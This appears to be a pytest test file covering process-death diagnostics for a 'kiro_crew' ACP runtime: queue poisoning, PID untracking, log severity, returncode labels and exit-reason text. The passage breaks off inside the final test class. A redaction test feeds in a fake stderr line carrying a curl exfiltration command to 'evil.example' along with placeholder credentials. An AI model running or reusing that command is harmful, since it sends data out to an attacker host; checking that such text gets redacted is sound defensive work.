"""``AcpRuntime`` process death and the diagnostics it leaves.

Death propagation to futures and queues, the registry entries an observed exit and
a kill retire, the death-log severity split, the returncode label before the reap
lands, and the exit reason built from the child's last stderr line.
"""

import asyncio
import logging
import signal
from unittest.mock import AsyncMock

import pytest
from acp_runtime_helpers import _fast_no_report_ceiling  # noqa: F401
from acp_runtime_helpers import _pinned_kiro_cli_version  # noqa: F401
from acp_runtime_helpers import _stub_sel_for_permission_tests  # noqa: F401
from acp_runtime_helpers import _make_runtime, _next, _register, _start_reader, _stop_reader

from kiro_crew.acp.runtime import AcpRuntimeDead
from kiro_crew.testing.wait import await_until

# ── Process death propagation ──


@pytest.mark.asyncio
async def test_process_exit_marks_dead_and_poisons_queues():
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA", "sB")
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[3] = fut
    task = await _start_reader(rt)
    try:
        reader.feed_eof()  # empty readline → process exited
        # Pending future fails, every session queue gets a None poison sentinel.
        with pytest.raises(AcpRuntimeDead):
            await await_until(fut, what="the pending request's future")
        assert await _next(q["sA"]) is None
        assert await _next(q["sB"]) is None
        assert rt._dead is True
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_mark_dead_is_idempotent():
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    rt._mark_dead("first")
    rt._mark_dead("second")  # no-op, must not double-poison or raise
    assert await _next(q["sA"]) is None
    assert q["sA"].empty()


# ── An exit the reader OBSERVES retires the registry entries too ─────────────
#
# ``_kill_inner`` untracks the root after its own reap. A root killed from outside
# reached no kill, so its ``kiro_session_pids.txt`` / ``kiro_pids.txt`` lines
# survived until the periodic sweep's next tick, up to 300s. Measured on the
# nightly leak gate: SIGKILL of a background runtime left its line for 293s. The
# reader loop's EOF branch now retires the two entries once the exit is CONFIRMED,
# and only then -- a closed stdout on a process that is still running, or one
# whose exit cannot be confirmed within the reap window, keeps its lines.


def _track_untracks(monkeypatch, rt_mod, *, pid_exists: bool):
    """Record every identity-bound retirement; the real one is pinned in
    test_pid_lifecycle.py against the files themselves."""
    calls: list[tuple[int, str | None]] = []
    monkeypatch.setattr(
        rt_mod, "_untrack_root_by_identity", lambda p, tok: calls.append((p, tok)) or True
    )
    monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda p: pid_exists)
    return calls


@pytest.mark.asyncio
async def test_observed_exit_retires_registry_entries_once_reaped(monkeypatch):
    """EOF on a root that the child watcher then reaps: both entries are dropped."""
    import kiro_crew.acp.runtime as rt_mod

    rt, reader, proc = _make_runtime()
    rt._spawn_start_token = "tok-4242"
    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=False)

    async def _reap():  # the reap lands after EOF, as in the field
        proc.returncode = -9
        return -9

    proc.wait = _reap
    task = await _start_reader(rt)
    try:
        reader.feed_eof()
        await await_until(task, what="the reader loop exiting")
    finally:
        await _stop_reader(task)
    assert rt._dead is True
    # Bound to the identity read at spawn, never to the bare number.
    assert calls == [(4242, "tok-4242")]
    # The status the wait measured reaches the retained summary: a turn or a
    # cron that records this death sees the real code, not ``<not reaped>``.
    assert rt._death_label == "-9"
    assert rt._death_summary is not None and "returncode=-9" in rt._death_summary


@pytest.mark.asyncio
async def test_observed_exit_keeps_tracking_while_the_root_still_runs(monkeypatch):
    """A closed stdout is not an exit. A root that never exits within the reap
    window, or one whose pid still answers after the wait, stays tracked -- an
    untracked live process is invisible to every reaper for the host's uptime."""
    import kiro_crew.acp.runtime as rt_mod

    # Wait times out: the process closed its pipe and kept running.
    rt, reader, proc = _make_runtime()
    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=False)
    rt._KILL_REAP_TIMEOUT = 0.05

    async def _never_exits():
        # flake-ok: pre-existing stand-in proc.wait that never returns inside the 50 ms reap window, moved verbatim; tracked for a de-flake pass
        # nosemgrep: kirocrew.test-sleep-as-barrier -- the stubbed proc.wait's own hang, which the reap timeout cuts, moved verbatim; tracked for a de-flake pass
        await asyncio.sleep(10)

    proc.wait = _never_exits
    task = await _start_reader(rt)
    try:
        reader.feed_eof()
        await await_until(task, what="the reader loop exiting")
    finally:
        await _stop_reader(task)
    assert calls == []

    # Reaped by the watcher's account, yet the pid still answers: retain.
    rt, reader, proc = _make_runtime()
    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=True)
    proc.returncode = 1
    task = await _start_reader(rt)
    try:
        reader.feed_eof()
        await await_until(task, what="the reader loop exiting")
    finally:
        await _stop_reader(task)
    assert calls == []


@pytest.mark.asyncio
async def test_eof_inside_an_oversize_line_retires_the_same_way(monkeypatch):
    """The other observed-EOF return: stdout closes mid-oversize-line. Same
    confirmed exit, same retirement -- a sibling left to the sweep would carry
    the very 300s window the empty-line branch closes."""
    import kiro_crew.acp.runtime as rt_mod

    rt, reader, proc = _make_runtime()
    rt._spawn_start_token = "tok-4242"
    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=False)
    proc.returncode = 137
    task = await _start_reader(rt)
    try:
        # Over the reader's line limit with no newline, then EOF: readuntil raises
        # LimitOverrunError, the drain hits IncompleteReadError.
        reader.feed_data(b"x" * (reader._limit + 1))
        reader.feed_eof()
        await await_until(task, what="the reader loop exiting")
    finally:
        await _stop_reader(task)
    assert rt._dead is True
    assert calls == [(4242, "tok-4242")]


# ── Death-log severity: deliberate teardown vs genuine death ──
#
# A warm-pool TTL recycle tears runtimes down via kill() on a schedule; logging
# that at the same severity and shape as a crash made `kirocrew logs` misreport
# routine recycling as process death. These tests pin the split: kill() → INFO,
# every genuine death path → WARNING, and the state transitions identical.


def _death_records(caplog):
    """The 'AcpRuntime dead' records, selected by the raw log template so the
    assertions can check levelname (severity) separately from message shape."""
    return [r for r in caplog.records if str(r.msg).startswith("AcpRuntime dead")]


def _neuter_kill_side_effects(monkeypatch, proc):
    """Keep kill() away from the host: never signal the fake PID (4242 could be
    a real process), never touch the PID-tracking files.

    The Windows drain stand-in awaits ``process.wait()`` because the real
    ``terminate_windows_asyncio_tree`` does, and that await is what populates
    ``returncode``. A stand-in returning without it hands the Windows branch a
    process whose status is unreadable, so every assertion about the post-reap
    exit status would read the unreaped placeholder on that platform alone --
    the double disagreeing with the code rather than the code being wrong.

    That await carries the real one's BOUND as well, off the same constant: a
    child that never exits makes the real drain raise rather than wait forever,
    so a stand-in awaiting without the bound turns a test whose child never
    exits into a hang instead of a failure.
    """
    import kiro_crew.acp.runtime as rt_mod

    proc.wait = AsyncMock(return_value=0)

    async def _drain_windows_tree(process):
        await asyncio.wait_for(
            process.wait(),
            timeout=rt_mod.platform_compat._WINDOWS_TREE_REAP_TIMEOUT_SECS,
        )
        return True

    monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a, **k: None)
    monkeypatch.setattr(
        rt_mod.platform_compat, "terminate_windows_asyncio_tree", _drain_windows_tree
    )
    monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
    monkeypatch.setattr(rt_mod, "_untrack_pid", lambda p: None)
    monkeypatch.setattr(rt_mod, "_untrack_session_pid", lambda p: None)


@pytest.mark.asyncio
async def test_deliberate_kill_logs_info_and_still_fails_pending_futures(caplog, monkeypatch):
    """A deliberate kill(expected=True) of a LIVE runtime (pool recycle /
    session shutdown) must log the death at INFO — no WARNING — while
    everything non-log stays identical: pending futures still fail with
    AcpRuntimeDead and session queues are poisoned."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    q = _register(rt, "sA")
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[7] = fut

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(expected=True)

    records = _death_records(caplog)
    assert [r.levelname for r in records] == ["INFO"]
    assert "killed" in records[0].getMessage()
    # Severity-only change: waiters still learn the runtime died.
    with pytest.raises(AcpRuntimeDead):
        await await_until(fut, what="the pending request's future")
    assert await _next(q["sA"]) is None


@pytest.mark.asyncio
async def test_kill_default_is_unexpected_and_warns(caplog, monkeypatch):
    """A bare kill() keeps the WARNING: the default is fail-safe so every
    cleanup kill on a failure path — initialize()'s failed-spawn cleanup, a
    failed session setup — and any future call site stays a WARNING without
    opting in."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill()

    assert [r.levelname for r in _death_records(caplog)] == ["WARNING"]


@pytest.mark.asyncio
async def test_kill_reason_lands_in_death_log_and_summary(caplog, monkeypatch):
    """kill(reason=...) attributes the death: the reason must appear in the
    'AcpRuntime dead' log line AND be retained by death_summary() alongside
    returncode and stderr tail. Field motivation: three unattributed
    'killed [returncode=None]' deaths in five days — one under a live cron
    turn — were undiagnosable because no caller identified itself."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(expected=True, reason="warm mint teardown")

    records = _death_records(caplog)
    assert len(records) == 1
    assert "killed (warm mint teardown)" in records[0].getMessage()
    summary = rt.death_summary()
    assert summary is not None
    assert "killed (warm mint teardown)" in summary
    assert "returncode=" in summary
    assert "stderr_tail:" in summary


@pytest.mark.asyncio
async def test_death_summary_is_none_while_alive(monkeypatch):
    """death_summary() answers None until _mark_dead composes it — a live
    runtime must not advertise a stale or empty attribution."""
    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    assert rt.death_summary() is None
    await rt.kill()
    assert rt.death_summary() is not None


@pytest.mark.asyncio
async def test_death_summary_redacts_credentials_from_stderr_tail(caplog, monkeypatch):
    """The stderr tail is uninspected child output and the summary OUTLIVES
    the log: it rides AcpProcessDied into a turn's error, and a cron failure
    stringifies that into job.last_error, persisted to sandbox-visible
    crons.json. Credential material in the child's stderr must therefore be
    redacted before the summary is composed (same treatment as the send
    path's 'ACP process exited' detail)."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    secret = "ghp_0123456789abcdefghijklmnopqrstuvwxyzAB"
    rt._stderr_lines = [f"auth error: token {secret} rejected"]

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(expected=True, reason="warm mint teardown")

    summary = rt.death_summary()
    assert summary is not None
    assert secret not in summary
    assert "stderr_tail:" in summary
    # The death log line gets the same redacted tail.
    for record in _death_records(caplog):
        assert secret not in record.getMessage()


@pytest.mark.asyncio
async def test_kill_refuses_info_downgrade_when_process_already_exited(caplog, monkeypatch):
    """A replacement path can observe is_alive() == False (returncode set by
    the child watcher) and kill() before the reader loop marks the death.
    That is a genuine death being reaped, not a teardown this caller started:
    expected=True must be refused and the WARNING kept."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    proc.returncode = 1  # process already exited on its own; _dead still False

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(expected=True)

    records = _death_records(caplog)
    assert [r.levelname for r in records] == ["WARNING"]
    assert "returncode=1" in records[0].getMessage()


@pytest.mark.asyncio
async def test_unexpected_process_exit_still_warns_with_diagnostic_shape(caplog):
    """A genuine death (process exited) keeps today's WARNING and its full
    diagnostic shape — reason with rc, returncode=, stderr_tail: — unchanged."""
    import logging

    rt, reader, proc = _make_runtime()
    proc.returncode = 1
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[3] = fut
    task = await _start_reader(rt)
    try:
        with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
            reader.feed_eof()  # empty readline → process exited
            with pytest.raises(AcpRuntimeDead):
                await await_until(fut, what="the pending request's future")
    finally:
        await _stop_reader(task)

    records = _death_records(caplog)
    assert [r.levelname for r in records] == ["WARNING"]
    msg = records[0].getMessage()
    assert "process exited (rc=1)" in msg
    assert "returncode=1" in msg
    assert "stderr_tail: <none>" in msg


# ── A returncode nobody could read yet is labelled, never printed as None ─────
#
# ``_kill_inner`` marks the death BEFORE it signals, so pending waiters learn of
# it first. ``_mark_dead`` then reads ``returncode`` on a process that has not
# been reaped, and the line it wrote was indistinguishable from a child killed
# by a signal whose status was never captured: ``killed [returncode=None]
# stderr_tail: <none>`` — the shape an operator chasing an external killer had
# to work from. The status is labelled at mark time and filled in once the reap
# lands.


def _reap_records(caplog):
    """The post-reap amendment records, selected by the raw log template."""
    return [r for r in caplog.records if str(r.msg).startswith("AcpRuntime reaped after kill")]


@pytest.mark.asyncio
async def test_kill_of_live_runtime_labels_the_unreaped_returncode(caplog, monkeypatch):
    """A live runtime killed by a caller has no exit status at mark time. The
    death line must say so rather than print a bare ``returncode=None``, which
    reads as "died by signal, status unknown" — the wrong suspect."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    assert proc.returncode is None  # live: nothing has reaped it

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(reason="displaced by a new allocation")

    msg = _death_records(caplog)[0].getMessage()
    assert "returncode=<not reaped>" in msg
    assert "returncode=None" not in msg
    assert "displaced by a new allocation" in msg


@pytest.mark.asyncio
@pytest.mark.parametrize(("expected", "level"), [(False, "WARNING"), (True, "INFO")])
async def test_kill_amends_the_summary_once_the_reap_completes(
    expected, level, caplog, monkeypatch
):
    """The status IS knowable after the reap. It is written into the retained
    summary — which outlives the log, riding AcpProcessDied into a turn's error
    and a cron's last_error — and logged at the death's own severity, so an
    operator filtering one level never sees the death without the code."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)

    async def _wait():
        proc.returncode = -15  # the SIGTERM this kill just sent
        return proc.returncode

    proc.wait = _wait

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(expected=expected, reason="warm mint teardown")

    summary = rt.death_summary()
    assert summary is not None
    assert "[returncode=-15]" in summary
    assert "<not reaped>" not in summary
    assert "returncode=None" not in summary
    assert "warm mint teardown" in summary
    reaped = _reap_records(caplog)
    assert [r.levelname for r in reaped] == [level]
    assert "returncode=-15" in reaped[0].getMessage()


@pytest.mark.asyncio
async def test_reap_amendment_leaves_the_stderr_tail_untouched(caplog, monkeypatch):
    """The amendment rebuilds the line from its parts, so a child stderr line
    that happens to carry this format's own ``[returncode=...]`` shape is
    carried through verbatim. Editing the composed text instead would rewrite
    that tail as an exit status -- the diagnostic destroying its own evidence,
    in the one string that outlives the log."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    echoed = "child said [returncode=<not reaped>] on its way out"
    rt._stderr_lines = [echoed]

    async def _wait():
        proc.returncode = -15
        return proc.returncode

    proc.wait = _wait

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(reason="displaced by a new allocation")

    summary = rt.death_summary()
    assert summary is not None
    assert summary.endswith(f"stderr_tail: {echoed}")
    assert "[returncode=-15]" in summary
    # Exactly one status field, and the child's copy is not it.
    assert summary.count("[returncode=") == 2
    assert summary.count("[returncode=-15]") == 1


@pytest.mark.asyncio
async def test_reap_amendment_leaves_the_reason_untouched(caplog, monkeypatch):
    """The REASON can carry child text too, and it sits BEFORE the status field:
    ``_exit_reason`` appends the child's last stderr line, and a reader-crash
    reason embeds an exception message. So bounding a text rewrite to the first
    hit is not enough either — the first hit can be inside the reason."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    poisoned = "reader crash: boom [returncode=<not reaped>] while draining"
    rt._mark_dead(poisoned)  # a death already recorded, status not yet read

    async def _wait():
        proc.returncode = -15
        return proc.returncode

    proc.wait = _wait

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(reason="reaping a dead runtime")

    summary = rt.death_summary()
    assert summary is not None
    assert summary.startswith(poisoned)
    assert summary.endswith("[returncode=-15] stderr_tail: <none>")


@pytest.mark.asyncio
async def test_the_windows_branch_amends_the_summary_too(caplog, monkeypatch):
    """The Windows teardown runs INSTEAD of the POSIX ladder and returns from
    ``_kill_inner`` on its own, so it has to record the reap itself. Pinned with
    the platform forced rather than left to the Windows shards, because a branch
    only one CI lane reaches is a branch whose loss is invisible everywhere else
    -- and the status it carries outlives the log, riding ``AcpProcessDied`` into
    a turn's error and a cron's ``last_error``."""
    import logging

    import kiro_crew.acp.runtime as rt_mod

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    monkeypatch.setattr(rt_mod.platform_compat, "IS_WINDOWS", True)

    async def _wait():
        proc.returncode = 1  # a Win32 exit code, never a negative signal
        return proc.returncode

    proc.wait = _wait

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(expected=True, reason="warm mint teardown")

    summary = rt.death_summary()
    assert summary is not None
    assert "[returncode=1]" in summary
    assert "<not reaped>" not in summary
    assert "returncode=None" not in summary
    reaped = _reap_records(caplog)
    assert [r.levelname for r in reaped] == ["INFO"]


@pytest.mark.asyncio
async def test_a_slow_windows_drain_is_one_warning_and_keeps_the_process(caplog, monkeypatch):
    """A tree that outlives one bounded drain pass is pending cleanup, not lost.

    The kill still raises -- its callers retain the runtime on a raise, and the
    drain kept every pin for the cleanup sweep -- but the log says exactly that
    in one line, without a traceback. A traceback here reads in the field as the
    crash, and hides the failure that asked for the kill.
    """
    import logging

    import kiro_crew.acp.runtime as rt_mod

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    monkeypatch.setattr(rt_mod.platform_compat, "IS_WINDOWS", True)
    pending = rt_mod.platform_compat.WindowsTreeDrainPending(root_pid=4242, pending=3)

    async def _drain_is_slow(process):
        raise pending

    monkeypatch.setattr(rt_mod.platform_compat, "terminate_windows_asyncio_tree", _drain_is_slow)

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        with pytest.raises(rt_mod.platform_compat.WindowsTreeDrainPending):
            await rt.kill(reason="failed session setup cleanup")

    assert rt._process is proc, "a tree still draining dropped its process"
    assert rt._process_tree_confirmed_dead is False
    records = [
        r
        for r in caplog.records
        if r.name == "kiro_crew.acp.runtime" and "cleanup sweep" in r.getMessage()
    ]
    assert len(records) == 1, [r.getMessage() for r in caplog.records]
    assert records[0].levelname == "WARNING"
    assert records[0].exc_info is None
    assert "4242" in records[0].getMessage()
    assert "3 member" in records[0].getMessage()
    assert not [
        r for r in caplog.records if r.name == "kiro_crew.acp.runtime" and r.exc_info
    ], "a slow drain still logged a traceback"


@pytest.mark.asyncio
async def test_an_unconfirmed_windows_drain_leaves_the_placeholder(caplog, monkeypatch):
    """A drain that cannot confirm every member's exit RAISES and keeps the
    process pinned for maintenance to retry. The status is then genuinely
    unknown, so the placeholder must survive: amending it from a handle whose
    tree was never drained would state an exit this runtime cannot vouch for."""
    import logging

    import kiro_crew.acp.runtime as rt_mod

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    monkeypatch.setattr(rt_mod.platform_compat, "IS_WINDOWS", True)

    async def _drain_fails(process):
        raise OSError("Windows tree tracking retirement did not complete")

    monkeypatch.setattr(rt_mod.platform_compat, "terminate_windows_asyncio_tree", _drain_fails)

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        with pytest.raises(OSError):
            await rt.kill(reason="warm mint teardown")

    summary = rt.death_summary()
    assert summary is not None
    assert "[returncode=<not reaped>]" in summary
    assert _reap_records(caplog) == []


@pytest.mark.asyncio
async def test_no_amendment_when_the_status_was_already_known(caplog, monkeypatch):
    """A process that exited on its own is marked WITH its code, so nothing is
    owed after the reap — not even when the stderr tail happens to carry the
    unread-status shape. Deciding this from the summary's text rather than from
    the status actually recorded would answer yes on that tail."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    proc.returncode = 1  # already exited: the status was read at mark time
    rt._stderr_lines = ["child said [returncode=<not reaped>] on its way out"]

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(reason="reaping a dead runtime")

    summary = rt.death_summary()
    assert summary is not None
    assert "[returncode=1]" in summary
    assert _reap_records(caplog) == []


@pytest.mark.asyncio
async def test_kill_keeps_the_label_when_no_status_ever_arrives(caplog, monkeypatch):
    """Both waits can time out (a child wedged in uninterruptible sleep), and
    the status is then still unknown. ``<not reaped>`` must stay: nothing may
    claim a code that was never observed.

    The two waits are the POSIX ladder's, so the platform is forced to it: on
    Windows that ladder never runs, and this child is exactly the one whose
    drain raises instead of returning -- a different contract, pinned by
    ``test_an_unconfirmed_windows_drain_leaves_the_placeholder``."""
    import logging

    import kiro_crew.acp.runtime as rt_mod

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    monkeypatch.setattr(rt_mod.platform_compat, "IS_WINDOWS", False)
    # The signal delivery itself is covered by the tree-kill tests; this one is
    # about what the summary says when the reap window closes empty.
    monkeypatch.setattr(rt, "_signal_tree", AsyncMock(return_value={}))
    rt._KILL_TERM_TIMEOUT = 0.01
    rt._KILL_REAP_TIMEOUT = 0.01

    async def _never():
        # flake-ok: pre-existing stand-in proc.wait that never returns inside the 10 ms reap window, moved verbatim; tracked for a de-flake pass
        # nosemgrep: kirocrew.test-sleep-as-barrier -- the stubbed proc.wait's own hang, which the reap timeout cuts, moved verbatim; tracked for a de-flake pass
        await asyncio.sleep(3600)

    proc.wait = _never

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        from kiro_crew import platform_compat

        if platform_compat.IS_WINDOWS:
            # The owned-handle drain cannot confirm an exit. It preserves the
            # process for retry and reports the timeout to its caller.
            with pytest.raises(asyncio.TimeoutError):
                await rt.kill(reason="failed session setup cleanup")
        else:
            await rt.kill(reason="failed session setup cleanup")

    summary = rt.death_summary()
    assert summary is not None
    assert "[returncode=<not reaped>]" in summary
    assert _reap_records(caplog) == []


@pytest.mark.asyncio
async def test_death_of_a_never_spawned_runtime_says_no_process(caplog, monkeypatch):
    """No process to ask is a third answer, distinct from both a real code and
    an unreaped one — and it is the state the reported kill site was in."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    rt._process = None  # spawn never completed

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(reason="reaping a dead shared subagent runtime before respawn")

    msg = _death_records(caplog)[0].getMessage()
    assert "returncode=<no process>" in msg
    assert "returncode=None" not in msg


@pytest.mark.asyncio
async def test_reader_crash_on_a_running_child_does_not_print_returncode_none(caplog):
    """The label is not kill-only. A reader crash or a broken pipe kills the
    RUNTIME while the child is still running, so the status is unread on those
    paths too — and the same bare ``None`` reached the log from them."""
    import logging

    rt, _, _ = _make_runtime()

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        rt._mark_dead("reader crash: boom")

    msg = _death_records(caplog)[0].getMessage()
    assert "returncode=<not reaped>" in msg
    assert "returncode=None" not in msg
    assert "returncode=None" not in (rt.death_summary() or "")


# ── process-exit reason carries the child's last stderr line ──────────────────
# A bare ``rc=1`` was all the chat error card showed when every sandboxed
# spawn started failing because the runtime tmpfs had run out of inodes. The
# reason handed to pending requests (and so to the card) now ends with what
# the child last wrote to stderr, and an ENOSPC signature earns a doctor hint.


@pytest.mark.asyncio
async def test_exit_reason_does_not_promote_the_last_stderr_line_to_a_cause():
    """A child's last word is not why it died.

    ``Error: failed to create sandbox dir`` describes no death -- it is whatever
    the child happened to flush last -- so the reason stays the exit status and
    the line is kept at debug. Pasting such a line as the cause is what puts
    ``HTTP 404 Not Found`` on the card of a death that was in fact an ordinary
    SIGTERM teardown.
    """
    rt, reader, proc = _make_runtime()
    proc.returncode = 1
    rt._stderr_lines = ["warming up", "Error: failed to create sandbox dir", "   "]
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[3] = fut
    task = await _start_reader(rt)
    try:
        reader.feed_eof()
        with pytest.raises(AcpRuntimeDead) as ei:
            await await_until(fut, what="the pending request's future")
    finally:
        await _stop_reader(task)
    msg = str(ei.value)
    assert msg == "process exited (rc=1)"
    assert "sandbox dir" not in msg
    assert "warming up" not in msg
    assert "kirocrew doctor" not in msg


def test_exit_reason_names_the_signal_that_ended_the_child():
    """A negative returncode is POSIX's ``-signum``, and the number alone is the
    part an operator has to look up -- while ``signal SIGTERM`` says plainly that
    something ASKED the process to stop, which is what the fleet's deaths were."""
    rt, _reader, _proc = _make_runtime()
    assert rt._exit_reason(-15) == "process exited (rc=-15 (signal SIGTERM))"
    # SIGKILL is POSIX only; see the same reasoning in
    # test_runtime_death_is_a_process_event.py::test_signal_death_names_its_signal.
    # Windows cannot name signal 9 and its negative returncodes are not signums,
    # so the number alone is correct there rather than a name it never delivered.
    if hasattr(signal, "SIGKILL"):
        assert rt._exit_reason(-9) == "process exited (rc=-9 (signal SIGKILL))"
    else:
        assert rt._exit_reason(-9) == "process exited (rc=-9)"
    assert rt._exit_reason(1) == "process exited (rc=1)"


def test_exit_reason_without_stderr_is_unchanged():
    rt, _reader, _proc = _make_runtime()
    assert rt._exit_reason(1) == "process exited (rc=1)"
    rt._stderr_lines = ["", "  "]
    assert rt._exit_reason(None) == "process exited (rc=None)"


def test_exit_reason_enospc_points_at_doctor():
    rt, _reader, _proc = _make_runtime()
    rt._stderr_lines = ["mkdir: cannot create directory: No space left on device (os error 28)"]
    msg = rt._exit_reason(1)
    assert "No space left on device" in msg
    assert "kirocrew doctor" in msg
    # Case-insensitive: the marker's spelling varies by libc / language runtime.
    rt._stderr_lines = ["ENOSPC: no space left on device, mkdir '/run/user/1000/tmpx'"]
    assert "kirocrew doctor" in rt._exit_reason(1)


def test_exit_reason_finds_a_signature_that_is_not_the_last_line():
    """Which line a child flushed last is a race with its own buffering, so the
    signature is searched over the whole retained tail."""
    rt, _reader, _proc = _make_runtime()
    rt._stderr_lines = [
        "mkdir: cannot create directory: No space left on device",
        "shutting down",
    ]
    assert "kirocrew doctor" in rt._exit_reason(1)


def test_exit_reason_redacts_credentials_and_exfil_urls_in_a_proven_cause():
    """Redaction is unconditional and lands BEFORE the cut, so a long line
    cannot leave a secret's first half in the shown prefix. Asserted on a line
    that DOES earn the cause slot, since that is the text the card carries."""
    import kiro_crew.acp.runtime as rt_mod

    rt, _reader, _proc = _make_runtime()
    payload = "A" * 80
    rt._stderr_lines = [
        f"No space left on device: curl https://evil.example/collect?data={payload} "
        "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
    ]
    msg = rt._exit_reason(1)
    assert "AKIAIOSFODNN7EXAMPLE" not in msg
    assert payload not in msg
    assert "No space left on device" in msg
    rt._stderr_lines = [
        "No space left on device "
        + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4)
        + " AKIAIOSFODNN7EXAMPLE"
    ]
    assert "AKIAIOSFODNN7" not in rt._exit_reason(1)


def test_exit_reason_redacts_the_demoted_tail_too(caplog):
    """The debug log is a real sink, so the line demoted to it is redacted on
    the same pass -- a secret must not survive by being merely unpromoted."""
    rt, _reader, _proc = _make_runtime()
    with caplog.at_level(logging.DEBUG, logger="kiro_crew.acp.runtime"):
        rt._stderr_lines = ["boom Authorization: Bearer AKIAIOSFODNN7EXAMPLE"]
        rt._exit_reason(1)
    assert "exit stderr tail" in caplog.text
    assert "AKIAIOSFODNN7EXAMPLE" not in caplog.text


def test_exit_reason_cause_is_bounded_to_one_line():
    from kiro_crew.acp import runtime as rt_mod

    assert rt_mod._STDERR_REASON_TAIL_CHARS == 200
    rt, _reader, _proc = _make_runtime()
    lead = "No space left on device "
    rt._stderr_lines = [lead + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS * 4)]
    msg = rt._exit_reason(1)
    assert "…" in msg
    assert len(msg) < rt_mod._STDERR_REASON_TAIL_CHARS + len(rt_mod._ENOSPC_HINT) + 80
    # Exactly at the cap nothing is cut.
    rt._stderr_lines = [lead.ljust(rt_mod._STDERR_REASON_TAIL_CHARS, "y")]
    assert "…" not in rt._exit_reason(1)


def test_exit_reason_enospc_hint_survives_the_tail_cap():
    """The signature is matched on the whole line and the HINT is appended after
    the cut, so a line long enough to be trimmed cannot push the operator's
    pointer out of the message that pointer is the whole purpose of."""
    from kiro_crew.acp import runtime as rt_mod

    rt, _reader, _proc = _make_runtime()
    rt._stderr_lines = ["z" * rt_mod._STDERR_REASON_TAIL_CHARS + " No space left on device"]
    msg = rt._exit_reason(1)
    assert "No space left on device" not in msg
    assert "kirocrew doctor" in msg


class TestAcpRuntimePidTracking:
    """kill() must untrack the runtime PID from the orphan-sweep files so a
    dead entry isn't chased (mirrors AcpClient._reset_state). Spawn-side
    tracking is covered indirectly — it uses the same session_pid helpers."""

    @pytest.mark.asyncio
    async def test_kill_untracks_pid(self, monkeypatch):
        rt, _, proc = _make_runtime()
        proc.wait = AsyncMock(return_value=0)

        calls: dict[str, list[int]] = {"pid": [], "session": []}
        import kiro_crew.acp.runtime as rt_mod
        import kiro_crew.session_pid as pid_mod

        def untrack(kind, pid):
            calls[kind].append(pid)
            return True

        if rt_mod.platform_compat.IS_WINDOWS:
            # Windows retires metadata inside the owned drain, under its pin.
            # Keep that path real and replace only the kernel-facing operations.
            pc = rt_mod.platform_compat
            monkeypatch.setattr(pc, "_WINDOWS_TREE_ADMISSIONS", set())
            monkeypatch.setattr(pc, "_PENDING_WINDOWS_TREE_CLEANUPS", {})
            monkeypatch.setattr(pc, "duplicate_asyncio_process_handle", lambda p: 5151)
            monkeypatch.setattr(pc, "_windows_process_handle_identity", lambda h: (4242, 77, 88))
            monkeypatch.setattr(pc, "_drain_windows_process_tree", lambda state: True)
